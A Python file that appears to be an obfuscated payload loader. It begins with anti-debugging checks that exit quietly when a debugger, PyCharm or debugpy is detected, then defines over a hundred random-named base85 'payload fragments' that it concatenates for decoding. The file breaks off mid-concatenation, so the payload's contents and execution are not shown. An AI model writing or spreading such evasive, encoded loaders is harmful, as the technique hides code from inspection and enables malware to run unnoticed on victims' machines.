#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_csXTKaH5kaO5HF = 'j!Y}A{N+Fq#S+PdSm+Jv2}9E85vtEZIrTt7hDB=@^UFO{&n+TA2n~wK)VksXLC<W&k;{UiW'
_cz_meWBIIp_OTb = '0&=66rgyOyV`7-6Bn$+bE!Mfc2Mpp(*TgKRRdRldi|NJ#2Od+aBSwha`tg*nOtiGXlQ_<C1'
_cmjhObC1cP0Ciu = '3-Yfd+4to!apVBx8tCnck#sOAitnJRD292d<N3lSve;6uW0IO$)?U^64KO*Nh!$=2@2f!Mi'
_cxx4FLdZZsioWJ = 'V%CSZjQ(^<czYb4eU_>lBJJHIx+ZQ#rWNl`{{c;G^ES{wk}3${@i6{cVLxy>|l)JjtGpzK<'
_cpLBiXScPv_g2t = 's@#34b*(Cu>Uh(|KT%=_kdOC7ycE&~z)MoTmD!Lui?rAHwjh&;4-wO*y+VHw!BwD(LVJX~8'
_ceN4Y178pNhJrj = 'RA307P&-gyAO`Uv%NI2n=}!FKjCoip8cgu+mb1b|7?xzar&DWw7;T(^)FdwLZ9Ub&_9o;Ei'
_cyOuyTHKmgQQ1F = 'Yp3XQNMHESV_VU67?zsNSGK0a<B}&%*xpU0cgHFs`xXP4{hKP?FQ-`-|CY*<T$qC^j|yf1D'
_ckwzOW3xsVaDpI = '(F%VO6S-ijz&~tjJl4>!rU=h$I2i`7Tqdki>7R`cY`XD#Dq^gVHQ(_;cc;3?{=8Y#ZBgKBH'
_ccRh67UaXTW8FY = '%q&`>D~1nXn`2+e%f-T++jr1J-v_@nW#IZ%*1M2LL5g9F5}%ae(Y9BslEKT>w%Nr#uHMx-m'
_ctQlboq5iX8Agn = 'EM#n$400B7BSEiyXmx)5WMdaoMTfbmYRzI3#2n`=8M185dEGnfeBcfdR8?TTg`FMNMuno%c'
_cm6NjpE0WQ0rQu = 'p-5-8ECK^WBW4R47wdX`vS()0(898{at~F|AS2oBUZHvxIcyE?P+S*yDr*muTA%KBLsYGCx'
_cbAyb3diLkpXt0 = '5E)DOe|o<EZNG(XbG-mas&7qhx}WZv?nD-5#&BWh7{-Nk7?ZL8~`ao8zR((32(#<)EC%=+W'
_cf0WB9LlznKgLA = 'Ehw*j~QQh6aHTt$K!=a>47s{Pnw?K5JC5hifpg594Q8x%%(@k`2-9*3~E|nbQc!>UL?72Dj'
_cwLfpom4f1Ox1u = '$56zUaT6G4FbOdx66&O%REy+|TVFwqm(VgMB2+Z*!8`gQit7hx(lPEc9Y+4&XCUJec-sY6e'
_c_GuLINctAe4wl = 'j(E9fD@%{ft-fFmZN0nFu#)~M$;)iPFZ9ugV_e<Sq*V9z4<RQQiFUfTP-{Q@3FS5AIH`0a1'
_chkngLaU1ZelwV = '!yR_zBh89Q7s;WjN1ID%d_FxNtaFcp-D|PN+ic7)FB|^P5Vac!T-^)jZaGD~5gi$MJ<bx`R'
_crcpWjvo3IXtSp = 'Eh1A*=_N^BZ|0LIch6seIA%38H+$y;6tpo0y4Q@RwxSE=6f$^3(Xk>K$7Ck0(P=xtRAyXfk'
_cebUP3TGyX7KcO = 'v|3WQcEf6DUR<L`$%U^RtYteLc=cVOT~1Nr0-96)pKkJK)V?`XOwvb_v*6F)5UXHeDreOiP'
_cgcjOfNl6PuoQ4 = 'GB;AZ6%CG)F>6(dWvcrI`{#a-Z))O?AbL{2mA_eh`#exkoPT%KN7;Dd|c@<K-R2jl<pp6IL'
_cyxxqUi1Tu8i9Z = 'V6lKhK1CFe-9x3>xV<}C5bB=GqUd_kXplIFn2{N*D;ib}nBe6qeW$&<oXQ`IjHP{1<>(`dk'
_cjQ9A5jubqsW9C = '(0BSOUU}(w{UtSQt1S<f;*h)*r4(Eic-NU*B60+BgKISo{L|CQ;4<&4LwNnzjUp-cX?!SED'
_ck2lzbASEAeuyO = 'PhXJNCM2jOLRJt55=VCrbhvV2aTQl!>A0P;5{3_<GP@;MY>;GfbBXxw2`@>v)A#E3RdFEAW'
_ctzmndSk6_VAHQ = 'XYak^DOz{jB%lZiHj}N}u_8Nj%$L?ckd@d<`;+3TEIp12<-@$k<HBx?8dN+Ls&`*DiidxOL'
_cdSIGy_bJ2tPLh = 'CrTxpty`0}y*ld$P8FK31^(<?3wf_&FN2$jBozOEq{tzV{2Ko15jlI%6}W4Q)tR@7UE7Aq?'
_ckmQoRJGpSInG4 = 'JI-f{kpvMcZd~;mOfDdv<Pc%M)lo<ox(MsT<e%o%y1(7{|R9wUD88QPG?!BNrXeWIPOUY1N'
_cisgsFwuFlgsM8 = 'N0P#;*Cmb)?)^%AOx-9s7W-0JehPEdNtu5&4>l&e*2r9I<c=Puc8EeVg4}9}SbB@ifjN?uE'
_cgRSwUkDCnMfpQ = 'r(WEmDP*L6^FG2gbczpPzq{&lD}iu_9ic0QS$lWA@&v5z|u`%Mw>~u9D~6W2?HRQ*M}-Gt3'
_cjTCNdW33Npldq = 'kU`TRBkFN9zcW%RW|uP4U3T^pG4U#99rlQ1uDz=VQ=n{4X3+aAtJlZJyx9%~^qB76t%vVB3'
_coxIK1WWlwlr0k = 'ywrreXt;#&(?Nti8QR8GgL$?l50g{!$ol$76)hfb1WZ(wRId+0j|H3viOF|oX-z?bvQ2$pK'
_cyYxqo9r0FGhdk = '6NUp0TA7tlFmv|$Xz8Z-1K{wKg+9q+mO6Yxf3b&qctTlLN2D1ZE9&EY50(}+8gLxu_e5}mN'
_cr7ufD4DlQv0yl = 'hijIj>`hFId~KH+-t+>^fBn@4?Q|DW?5uhiH@FDUXjYc=%DnaK#%8kw-ZMMw`gv7t&N)6v4'
_cq6KEuNHh6Okhx = '_G6*5U7y4==@Ux>LVqhS5KJKUfoGUKfD1EW2g6Jz)*=E_l<pm1p*$J*ikyrr;%uDJL)C8mo'
_crzOIEP3t4Ploj = 'pNMnxCE8BY8C%5zOxuvsp0v;2=()fg!6tEOK7}O#@Vcf-6apsN4twUnBik8eIL391aeDv2$'
_ckBkxRQDlGKFfz = 'AzU7eo1Tig5}+E^)cKMfvNi1%qt6Vf>EjGa;LK7lI@Bf}A|)ToM<AxAFg-x<g{EzriAL<y%'
_cw3RsrneuC2O30 = 'nw!T>E;87<{eBTGg5m~To6~c+xhE*HIvL}0rT(@Ic5D*SI$}oC&`-PBSKPG&Zy^kB}DX0&V'
_ckQbRDlKwlD9Lv = 'aMnNP0=Xp0vOiel?n?R;!Gmc&kb1_6@nqpSJ1tdd{aG1*FV*v4OW68UOS0Jz5G<hXa!ZlSe'
_c_qJrdc2do5gHY = 'JNlr6ABBOfF>{)Wb9w<-+hHiG%iZR<o^HCw$I7A2}y8kzkA&I@0T(f9i3S%*A-khnCHzKfh'
_cjI5RIuMIuOf3g = 'j}5l-WUn1#Jpl9>B~nP^*DSam`2l;+_)=&lPWr#WnYydSF55>rV=NWGk#Nig^fMT>d#K<Ge'
_ckFjCFAF2R6zIH = 'V~W$su$Eg_pQ6HXeeJLA&WcD-2CAqPlt%MUU-8;;oBlS86T!#XvrlET$9Rxb|WSB#>&u%lt'
_cpUGb5atU75PKm = '0R`USfHIN?SJT)axDEK`5nLfy-CnR+9mw@i9!8onzD&eJ8*)fDd<LL|>pU*6pCed0rv^~dt'
_cjzLeEAotprrOT = ')cnW<H9p6oWBdPSF`sM&h)%UJR$LyJ=D%C6!h2sz-j{BdqCG%~-J=^g%}Q||#b#a0aQLky_'
_cbIee2A1ttzLAB = '3}cImJ|N87nMW6e7ICslgK~M?<Ey2KRKR%F!@MEyvfxXZT|}zKe4)WI5aE_<%FWTgPrY`4w'
_ciJJolQC0d1zQq = 'VP;Bis^|>#)rliw|N0r5QqE9=ww<%@q^QLJG9XqQt~SWg?&6k7O2=d{3>T%?Ww^(Q*xNuhK'
_crSfYaxxuHFZxr = 'r-*MJWoRlQ7=re4W{!22N+?ahja^hOlBHiTJ=EX$*b#1!v6C4lsL79Y$uPzr*pafffVf7a?'
_ctM5Ol7Ycb2o9u = '{>t-;*RJe)L$_%^u@mOqikV2D^36SAeg(AlSdV9{E0iTms(sUTB35+dDf^~7UG`pNr`A3z@'
_cdsA3e3cLtoxf9 = '8tl3zJ6`Tg$@<kFCJJ*v7`ji3HXeoussCM%&Ob5cUtmB=(1-wGQuB<q`^?55ql)tSu}?rDZ'
_cp_5T67PpkvYML = '|&?K6`-?K{U(;aCeTcb;F`tHt+})%zu0hq>(mv9?k_V+nO|OL_c>Ov_xwpBDc$IBV2$Am@*'
_ci8DwcDOxS8S0W = '*b?BLoRdmgn7dskPA^DDJRyATRMI9O+AwtNZfP&f3H@1>(=Pl}2r1eSnWbe*hxyIWjTJ)KS'
_cgxIyfQvAyF8YW = '$1P?E7GIC^@%fDPVXMh)$?K6_?qN7U%fcx^QNVABSXgNN^$ynkw8XFmm9K+%#H1Rs^@0{s+'
_czo7lQRj8ixCE3 = 'Q&^3AT@r*6N2ILoq4(Lke?sG9Cvxw#n+e_#4pn{I%MK_&17Bg~lQhmhz>K4xR{B{VNGAF=~'
_cmmdBjwKcAFMQs = '-*USRih3}uo?s!@z8js*cQ62*paWTFa4S5pj*6bfV`_a%&;Z^k*l3gSlCc#}g*R)0JbHb5S'
_cdQjxWcZL6y_Jt = 'kG_#OGW2~51+5b-Ncr0?d0i=!!@sVPxCemHa)J)#i4=R>xy9!*NTM5xO(+oyv=m1SPr%;#H'
_cmO6ORWJdvCn9q = 'EU?;<fPVj~umNo#N@gH_VNqwg}?rYCTBZlKycryl3HSbuc%^djexyymk^J_X=w^Iol(Y!*_'
_cu9zyAk6VXUGxy = '~qs+slqx`P&tW(@LR*SZUb>x2{sHud(<AJx2naP{nii8g6p2<O@V=c7#Zc7@KOYEb1kGtJe'
_cwwRuv9OMEvVfh = 'Kb9M`irU6+uj6~-i2N0wiethr6PTuw_Eo8e?1mPbhHjn%-n&qy6%5Z$Bh3D^bp<N+~;5fjl'
_chfPTLfM2DbBe3 = 'bN;Q#*5{0t3By5Mt@MNwdV^dr!Ipf-^=F6R3afT)?ZFRTxw$z+C<elGS>p45R36-#m<PFU6'
_cbMBrv0SoSuFqX = 's8w_WrmFrTa*n~X+b#{g83hJ2ks+fwlAd=3jZ%PbSl~8R28GcJ>OB3PYrUJ+-=dk_IUd->}'
_cf5o5WWX8XU9aC = 'x6+I_<AWIisYhZKgraKSBlK-4FLd;(Kj7NAd{As-A|f6#A{wHzQ5t`pg+#2aQ0C{0=8`<|0'
_co978I90rasGPr = '2>r`-c<bY@SA!5)V^bgeaVn4Xdw(abLGsXI3r3n=7dZfydk&<4KALR$dw%YZMH{SApz1Xm?'
_cpzcEs3clR0yOF = 'NWDWC4>ECYRH_R~<L7BF`5&XJ*8;PjRajjiic_Wos3S>8)Q%X}{?2ur%<c5zf)HH1u$v{$g'
_chiAJze6_1sdJ5 = '2{)4<W{Iv?+T1)Nqrf2<Mr!^v%v$m75#7tw<vcg2#=GOSC<LMh-7V_OzS_E0Pd!F${Nzd)n'
_cf7LoJidGnPrdk = ')lmsXH?eWTy<fNtBO{k(p3>jq|oH1f(_CSN`d$LID9MXr)7*Zo~X@RxHkE@4~}^FpbbFUnQ'
_c_oH0POMPwbfcL = 'I@rsoy75fr?>-{Q=y{@;f;=6Dpkqr?1hTV@*nZ?$IC<8}T+BSGe)YO-2fZ$6Kx1L48-lLv%'
_cqQV7vNF70mKw_ = '9~BhSZ8Y9l@&`Y<IN{4b|aRp%!dSGfckyjR#hV@@@bTyzqY6aF7(rwh@f_3>wA8r1y~a?9?'
_chAyh7GH71r5zL = 'Uf{AjVv*lS$k%~RmAw(nZ%&xQoTNwSMCooK^C_=C^nSmP^BfViSC~uV80QXz`<ueYz3u)>5'
_cbEwJ3eqr9QL3i = '%SmvWVVK{xZ!B_}tiRo0x0TaC4%3zo<4)fs6IXZR^m@y<G>;K_9e0haJxEZ|YRw+!DS(dcA'
_ci03pmzNYWTbbY = 'EZJ4vehlm_*KxnKd<@>>VG%fqW}dp&a;A}Ky0duok_e~v2K(i&2R5#Z&Td{>o<?=TBEIn&o'
_cdSmiUjb6cG5eJ = 'w|>ssOiwB3?1lwk)?rMvP1x$yH$tF{smlp(XeWG|D-&i&aCiOS;J<&6)uVYgv1{nxC#G%c0'
_cxQcWksogTiFw7 = 'Rvsk;v-@lW7NLVwHmR=g0_y~%P|NLiP%>V<pNJK?^yt@0G~0{fL}{Lktvg!IvmzDom>yDz%'
_c_Zs6QeCo7lbKy = 'AH!OdQ_OWZW1y(BuOePtRrhx$EOvu#X!N}pZ=jZ~uU+07oDgGDx(~)47U^zEq0t5Jm_$kYd'
_cnBbZizdQOg9B_ = 'q_*AD<LcuacznG#N_qO}h|J4l;4f)h1VAdMb9NwxRaJF~s_>G3@$z|$H;o7G!&piOLc5zkY'
_cbe9EAZ47rEeQL = 'ClNPtqq2V6Bq1zo%@2q5Xia$gBJw9z(cwF;uNnZE?YY7#L?3RuoTUDxw9`}4(reJBx=WUiM'
_cry8WaT_SG9dcO = 'uKMH8uezMFge1?=<3mnnV3i<O#E&x;g}f>Y-KFkK%Q?C|vq0a@m1FbkS-3$Y;s;Hr%b#*Ky'
_ciiAkxoc4pzsNs = 'Mjl{X}$3oIq<%%!H9m^^NjYAUq??JsWPiNigOqjHuY0XlOz-Kj7@)Q;$Js4Eg_R4-8)lc70'
_ci7hx9SZS5ayQu = 'ngXTc&zF(m3XiWLNN=*(7IN#k{CxvZ@24nOjzUBA!OGAnYGF=le4<KsZW6#zhB?(D?gdl(D'
_cteGMkpQNC6UrJ = 'Y@uvG4hoHV#Zav03m7CLa36!@9RA6S2W5Kwv4fYoo6lEAI*Wb|0xjOqdC$*<oUshqHgEXxW'
_ct8_yRBzVzB4k5 = 'y46FMpBJ;-M<frHYA{ZtOrJKlU~FVf#Kqh(N4XPG&rte58{bSI4}*yGd7jS-)O=Bik3S+&6'
_c_nZ9GXL4j2Z6z = '$H|Z*dIA*3L8;L1NC?U{F^$1$>lo(q9+N#D7(l(Ge-|C35~BoepzMr^DnhK)^FG76D{MXkh'
_clpIySqP4Rkgf1 = '^cI0m72^1_ckn_UD>$lRskHIvAFqgldO3DOuCzYVasqqEOqJHMEsi>j?n7yPR<o46DbW1&T'
_cldQrKstRAYRa2 = 'zniSRrHkVXGi3+-!9Yg7@%2(`Y8Vy5^T02#|c!F#w&w{p~FR870eGf;sQTucK>=#7GH(d^r'
_cg4HLqSZJ6OSie = ';9)+UB**2C0I(_Qjl+qGB4BNIAcZ`^_*x=_g0jZC&<$vaY;?b=CAKx~NuUsS^*}{=J75H$4'
_cwRktie_nEt8Xt = 'wGA?2b}Iny*Pl#!kH^B#^Unnku=WiuqV{`!DzzLcHumc{A0f-9&&V7Qsnmna4zEM%88FOrN'
_cqACbznFwsZt1T = 'q@n6$Uz6L)B-%!y|z$U6Jy2aHmp)A|uFQ;6C;z%@=>?Tpzj%@pfPfkV+rKiI!171Tz_6nPk'
_cy_CEtFZfiwXxt = 'rPZ%S{Ye{+Jk$S>E}0ZhfwH08}u|M@}hMqJcfo`%Pfe@DVM%ckY2lX}M*9~Wkv3tS{CC*1m'
_cjYcZLqEtmZINb = 'A<f)cYBiTjgTq{gaKVN}8E)o}U`XYVPX!(!H?m>YEFngM<VsW;o_)5yBqMN2fD6Y94#u#Ey'
_cqaqCivHZtwFak = 'J=mxZGSklF;|<7*9N@>Cr``Zb{9DqHC9rpSz@lM(hm>DNmTTQN&ZIYrk#eh$*}2S3o&CaR#'
_cj_SLCdYnRgVOF = '_HAZ%vwjQ`q&Fj+<||*csGifYLzx*H_qOBtV6R>idwgVS4DSoT|kL*kA6A)W-pHID{lkq5<'
_ck9KkHKrsx6hRK = 'V<{>M7*U(}mr-|9!=M=iOLoOdjfxtqtx=?>C-p*^yvfN~)t4fgq;v6P1z+E+~MrYh?9)6Z>'
_csqzpdZ7WrRWTL = 'Dls-6AlA)++A?{f8?9Ay5_g81bfl^^9G!p-)nn&+#o3J<x(<eC5l*d75cBK|%61F2064AU_'
_cl3SC7p2q06oHB = 'p5G{z@6X<IN1FgPXT8@Lza-otM)wtB}r-r5bdT6|+Xk3C62M>K_`ig%CalHc^1<s{rU;Ow+'
_cqJsZrGTXAWj8W = 'x^*5W&Xh2tRW_7&=V*ez@;%Wj-#!qxnbrz;%9<`d-Yw{R#9=wl?#wNL)<u%tZ@Oie&1AzR^'
_cb1p3XT2JEOF5S = 'c=(^5COt35xOf{xWDtkCX;n%ERiNqFh}*ocXbewFyZ&&Gk|GV@7#pu4?9m`EC+~s4*wFOP!'
_cbnVswbXH3cUfl = 'N1NV;YzOj}$6{IKU24FYEI{^DX}E1Wru2A@d0I1_=#eD$l{>GDE*VZLieAC;lNF7lCtbT)p'
_csH96NGRA7N0xV = '<i%1|wpL;!J7A7iHOM8)kjqMK@SEe;UA{BEQ7;UM-CTt*XVrGB_A!q7hmyOvS`Mswv1$8C$'
_croo1FtcTPJz76 = 'FDek2<puoX{jf!;P9pg3eg3H*#1~}g#;jkZn2AfPnvSe@k%rKXa;WY}2wHj_f4POyP>fBf1'
_ccgRicjYTCkUhc = 'nC3K)Y6785@4205-J``W1?E$rzLB!P3xE}Pufn-|gU@kn+=mlqmCYIq27aOl3Jga&m}NdL$'
_cbo2rWAjV4oujR = 'gGmbOdmYp145rfOJ=BsrpBA9m!GL=RMs5Mp>)T0-513(re(;P^1MLrSp!usFa2uV4RxL{lu'
_czHwV7Qba8TzW8 = '4veB))yAQ(^lt>GX*Vnb15pEQgcA#+B7lPn;Zi=;ua=c*g60CcK=OyVRTTWg8bscX%}TFpD'
_cmQffVa6THMUFw = '{FU?>5<Sf1V&d(n^aj*&4ry6#o;2r8EW6XNg2S8x`F0JE59a@_c@ei{RJ1r3227G2kVoLdi'
_cePfFhlwA9c92e = 'Bq-MTZUbqY#CZ2nlY}D~hGm|J;;O{`*9|6fk+dl6gUy4hC70ZCDxq?zJR?==4VgbMBnT+$D'
_cdY1oQZmX9UxUB = 'i!IBCK_R*{$p-~kT^%zs&D$XlE5XJnK+Op(*a?&H1gl_)Gr<Bt9C`Fy`HH?3zJ!eK05&B_j'
_cdGLPEKHE3igRr = '-izp$8B?M>WOI7?*I}{MG)Y+OZi^92RTQ+c#n@-J+{8F9<+I?YqXRFC7jNYXCHeFsu^r=c?'
_cgcm3jNrcNHUmY = 'KdJX-%{h&VJqp%BC)>{75=n2<uJdQe5r!9*OA3(AwSMOYY}XS2O^1=mt7h^1et;!Ly_T2~r'
_cvZVRopuTU2j6G = '3kcs2<3INHQ?It5m|qkla$E}8W}u#N1k4gEDD4pc84VyZ7`QGrbZpmzOq4iuYIPVSir88o9'
_csLouEqszrJ9mA = 'MTK=bs9Z+Eu778)mc5(O-Tllpn6cYiV%>u~$DGlikS5Xmy?{~?$`4aaD)rlPffsF)kgoi1U'
_cwIM2PkGHnJdyG = 'x#)Gr3J==UJ)|g>n5JK4>YI@-=dnb4f&K8U5h_1EC3_|j$$0AySqD4&YYS>Nk=nvAO>Z=*K'
_cqpyxKLa1V8ST0 = '&?&+$GWktmc~fmubLXBhJc7>HMO4=43iUs;jRAc$5Fj|NK1!!*@Ald-8n=S<%CYCc_(paxO'
_coQvradEURsux7 = '9O0D=B(((mCOoo3!y9gca7P;k-D0B`+m9@mW}6rkQR6_!-<?iErDU7RDEKp7arHhM?7-Y+e'
_ck8b6eAiQ3LDMF = '^#okxH(f|O7(o-?~%X^qnNytKO%IuC2b^Z#9QqPDr4Mck$i(kxS$;1~ZFDA`$Vsgt8W*d5D'
_ciWRSfMBUXrWo2 = 'QzrPxY+3mpabj~Yv(Bva0NIRzuLJxAp-FE^iF|3A_q1Do5qx~|5-UK^^Og)~doLOR$bL!T+'
_cr0L2PA6ExYEGr = 'OQVbBr1Y&IvZ8@(z(jf{4<40gd|n~5nNYMTu^7l80;{&#t+@$6cW9{?4QHCIeMS%f*|*fr8'
_cie04Vb6y19fUn = '8iU!CC7Hj2Em1;!CMmWd9(8ne7rVw%XX{Ls<iv-inuvFt1d#tuJ1+a(tekish+E24fU8|hW'
_ctfrmMtzH5DiKI = '4RC&9(eC=8;QG7ksKop@Z+jPqg}3jX|+@V<~4)LsB@VI4wZ0ruJXkTcD1Q#xF-RwetkzBQH'
_cyDiUnu4153R1p = 'vVA~5}xz+TAMqP~TKhgtXV{b_=>Aq3;r>yO91Nu&*WF~~JcpwUQcIi7J`o*1V3$OzRz=%`y'
_cfKzjGnIoFFhb8 = '#fPkuMcQLKkr*ug!^R%!CeO8x!DzX1<6KAsMd=1|E)q<PolUYO~DBt4_8iNO5oDP4^;8mhZ'
_cs7sAwO08Cuayt = 'Ug}{m94A0)%);*fZxarlI?8dH(0t({>>AE1eZqww+v-REdJg%2(9gZjdl4ftXPK{9$6>6yk'
_cvgnlXCGfASEuq = 'fNB)8F8Wrc3NC3o(MgMh=4Wwi;kq>w}N997c1PL555;Zm~~NhGgO)2?Q^vPDFboLnyx}kB7'
_c_elTYDDzFnbbe = 'y~=mX1>)#uIk&^)aN`q557F4)>+2bZ*#b3$A%(6cD-IM&}ryhA(UBnW-vKRpWvK@rMCbZ+O'
_c_nS_aQBwUULL5 = '?XfQu+`mN~P8dFe4qB;#HQu`BAnV)3z&1-b@(<*N{;b1f9o>4A<oY9v*EC^Bv66&-CbaIfO'
_ccWNK3fn1DrEft = 'Ngt*0=!W2&K%6J#juSIs8P5uBQ#|O@Xz@e|{0RYB*B%(2EG@iGo5xSMIUc^O<f*EnoD|$tU'
_cueXSy1NBmv3r2 = 'h~YHY!?+YfJg$8vI)(}VHJXvl4x*<Hw#lfdBt1qxo<hj@3k;jg8<(3J-JoM@c^k^o!qP5?f'
_cjUgBEn6c4WVGj = 'X?Uu#&vY7&VgL%_oZDOhQYVNJ#}2%bcKQv3E*-e2V(+kCd1N7>eAR@j*b$32SLBoS@(&-F1'
_cr2MdXHFq2WBTJ = 'Y%nJl2w)?J22TLU7HJN$6%3nS%}skevLTNtPEn&vmd*rmcrsc0{H+&T@aa(+jrL6s~vGKB5'
_ciN4WNElb57CpO = 'Dleo7SQ-!(b;NKNg`{oyb!Q&6eCZ_<V<dVRFB#ZgEsz%tTmoz-@f6gDJDBtV}?E?vX!a_mb'
_cagfIaMB_VHtGG = 'ynm7f2fpA&vH6{WTUzo-gVok9L_nu`GVIXws-X=&}qHrRNw2%AqB#Jbr{kpu!+n{T6D@_D%'
_cnMWqNcZTzNGWq = 'EY)K!-eC7|dko(uag7x^0o>?;WJ5HGjNVrmTF@6KS4sDAx=@d1GX`$%t&YbNusaOiYStVqh'
_cxkV0xxFmXznPo = '7>R^({av*XFqcx@Z8DxglmNFbQWAi<50<`yIHl;q0(9|NE+e3yT_Oi9Ub`SN=Ijzg-LsO4m'
_csDsBNFnHUk3yP = '1(_j$1`bQobjbtTZR$<c;pmI*Mw`fqnM7j|(1Em+v%ERf(AJWBe1Pg4ztsQ+MMS^SjqLPU!'
_cyDRAlzf8Q0BHx = '$G6`$V;1fs_ok#@MKAqJvlY<1-GB>Ks2?b+Mgo9WxOzHN1haOs`K{dGz-rlh07c10K5R*<E'
_cw22oKo75a_QGE = 'GymcYsD%u_&I_<-Qvg<Ro5eRoH)tha;e8cmrMbjQ-PjICG6}l?qjl^a3c8aL|BO<c&1+mE^'
_cwXavjm2YWu0is = 'MgZ}z)c9*y0GVu_{b|V~ozDoml!b2vgD)V*`%vWxx*Sbo)@wqV-9!^~rN+Kfzk)AUvX%8v<'
_cd6FDW2IPtF5Sr = 'nLCLvR06L-_-V={<5W~H_UTH8S(y}h_+S2Em8|guw1Xy8eG+IMd6JWP_TI95^ecm{rqX`56'
_cuitkxqaNFTuiJ = '|qob;i~F3mqJa1a6guhbVc9w=VP1jgVy!JLmif&5Bd!?57KtQ@rUF^C?cY)n4o*k)@X@)(L'
_cusPUQCl8bMR_i = 'YhOT`#VuPDH)&Gq0EpK+CF7?cxcN#YK<d(5gD<B*L$9ecNx_n2un<l~YjV(FE5wEXE}R77%'
_cno04_Svcm7Fdp = '5O9k()@w{0!)$Am}>0OkUb-#jBBGp@F=0c>=F{)^L@#ie9`6zkELx`4s2o52pqtn$a-I2`K'
_ciDwPfEWMspHKb = '!cX&R$uYQkIn~-3=xRbRYAuHuF1$g6+#}MkIBU_8lPsj70CW7A@lp~{=<;lx4LO=ZMt+)vq'
_cwSXjoewsMGVLc = 'Aj^-ccJjrT^mIrY$ODxqLU)<+)qD6Ot9Dwj=_U?OdU+(1c9001Bx$a<P2ciau~+*WiIZss&'
_cweFtnvHM4V0tx = '~OO^pdf%#qv#3kr<N$wD77(Sxo=`r3E1g7Z*dm6u><5ar9ZmT$O$>g^K1101F4vLG#5%?S!'
_coMVEKNBLzy57l = '_&2eHM+j2%h*F3QxSWBdT~mdscGnT+-%giz)acraiV_Kj90B#P2bW*auh7-BjK-zh?BycEJ'
_cyUg5g0C7z9FsQ = 'jEcIPfInINqBk&oQlsgzZ<=g*GuGc9oGFlfn;gv3uyV+5)Jb7S$Iaj!e6-_D@Fz5hUtX<Q&'
_crhssAEWKNK0Wy = 'qYyh_iD_j(5CUw|nOjS)RERhBRWTOZ53hwTNRpjzUk5_3?9sVf%Qhv??@yDVWgVtmXM;j*7'
_czePyGvecOtx2O = '^QN~(BN32_+P)IK~nrmL#Mi(CzRwNSYwGpvZuf34n~5K#JbdliV&5irTs@#&DI;p2+ax0vp'
_ct4UfkwvVvJR58 = '?lPz26?T*p4Ydy``#sR*k%yLH;CXEcsRKwD9Xz+;Gf4AFcwLmlEihpg%w6Q$E}<ZYxYhJE%'
_cc2H2QjZR7AdON = '&Q&pvoW{Ipn&(KP+wleQ@-;DY^gNt*LJ!<ZdX*V8I`7@9sj@)hJc2u(4q-n@72615mdmXG@'
_cfPy47r3dxVt0q = '$9TVpr#Qlwa^@Ym&U4Gf5Di{qJ`%zN3>H0q-=@x)23vvwNAd}>#+9z5hh%fa=Fxg>6>!z%2'
_cp2uCAhTEqCBfU = '&|~UJ?`SC~wkW?$_E3zQ7Tfr3'

_pnUNnhnWSwLs8Q = __import__('base64').b85decode(_csXTKaH5kaO5HF + _cz_meWBIIp_OTb + _cmjhObC1cP0Ciu + _cxx4FLdZZsioWJ + _cpLBiXScPv_g2t + _ceN4Y178pNhJrj + _cyOuyTHKmgQQ1F + _ckwzOW3xsVaDpI + _ccRh67UaXTW8FY + _ctQlboq5iX8Agn + _cm6NjpE0WQ0rQu + _cbAyb3diLkpXt0 + _cf0WB9LlznKgLA + _cwLfpom4f1Ox1u + _c_GuLINctAe4wl + _chkngLaU1ZelwV + _crcpWjvo3IXtSp + _cebUP3TGyX7KcO + _cgcjOfNl6PuoQ4 + _cyxxqUi1Tu8i9Z + _cjQ9A5jubqsW9C + _ck2lzbASEAeuyO + _ctzmndSk6_VAHQ + _cdSIGy_bJ2tPLh + _ckmQoRJGpSInG4 + _cisgsFwuFlgsM8 + _cgRSwUkDCnMfpQ + _cjTCNdW33Npldq + _coxIK1WWlwlr0k + _cyYxqo9r0FGhdk + _cr7ufD4DlQv0yl + _cq6KEuNHh6Okhx + _crzOIEP3t4Ploj + _ckBkxRQDlGKFfz + _cw3RsrneuC2O30 + _ckQbRDlKwlD9Lv + _c_qJrdc2do5gHY + _cjI5RIuMIuOf3g + _ckFjCFAF2R6zIH + _cpUGb5atU75PKm + _cjzLeEAotprrOT + _cbIee2A1ttzLAB + _ciJJolQC0d1zQq + _crSfYaxxuHFZxr + _ctM5Ol7Ycb2o9u + _cdsA3e3cLtoxf9 + _cp_5T67PpkvYML + _ci8DwcDOxS8S0W + _cgxIyfQvAyF8YW + _czo7lQRj8ixCE3 + _cmmdBjwKcAFMQs + _cdQjxWcZL6y_Jt + _cmO6ORWJdvCn9q + _cu9zyAk6VXUGxy + _cwwRuv9OMEvVfh + _chfPTLfM2DbBe3 + _cbMBrv0SoSuFqX + _cf5o5WWX8XU9aC + _co978I90rasGPr + _cpzcEs3clR0yOF + _chiAJze6_1sdJ5 + _cf7LoJidGnPrdk + _c_oH0POMPwbfcL + _cqQV7vNF70mKw_ + _chAyh7GH71r5zL + _cbEwJ3eqr9QL3i + _ci03pmzNYWTbbY + _cdSmiUjb6cG5eJ + _cxQcWksogTiFw7 + _c_Zs6QeCo7lbKy + _cnBbZizdQOg9B_ + _cbe9EAZ47rEeQL + _cry8WaT_SG9dcO + _ciiAkxoc4pzsNs + _ci7hx9SZS5ayQu + _cteGMkpQNC6UrJ + _ct8_yRBzVzB4k5 + _c_nZ9GXL4j2Z6z + _clpIySqP4Rkgf1 + _cldQrKstRAYRa2 + _cg4HLqSZJ6OSie + _cwRktie_nEt8Xt + _cqACbznFwsZt1T + 